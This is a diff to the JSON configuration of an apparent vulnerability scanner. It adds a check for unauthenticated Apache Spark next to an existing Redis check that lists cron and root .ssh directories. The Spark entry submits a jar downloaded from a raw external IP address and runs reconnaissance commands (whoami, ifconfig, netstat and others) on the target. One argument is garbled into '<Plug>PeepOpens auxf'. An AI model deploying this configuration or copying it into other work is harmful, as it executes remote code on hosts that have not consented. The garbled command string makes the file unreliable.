@@ -126,5 +126,24 @@
         "checkDir":true,
         "key":"redis_version",
         "dirs":["/var/spool/cron","/etc/cron.d","/root/.ssh","/home/redis/.ssh"]
+    },
+    "scanSparkConfig":{
+		"isOn":false,
+		"name":"scanSpark",
+		"type":"scanScriptSpark",
+		"msg":"scan spark no auth bug",
+		"subject":"please set auth spark",
+		"code":"none",
+		"refer":"none",
+		"conTimeout":10000,
+		"readTimeout":10000,
+        "sparkVersion":"2.4.0",
+        "appName":"ScanSparkPoc",
+        "jarFile":"/opt/scan/GBWScanner/conf/spark.jar",
+        "jarUrl":"http://128.199.250.129:9998/spark.jar",
+        "mainClass":"com.scan.spark.Spark",
+        "args":"whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp<Plug>PeepOpens auxf",
+        "userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36"
     }
+
 }
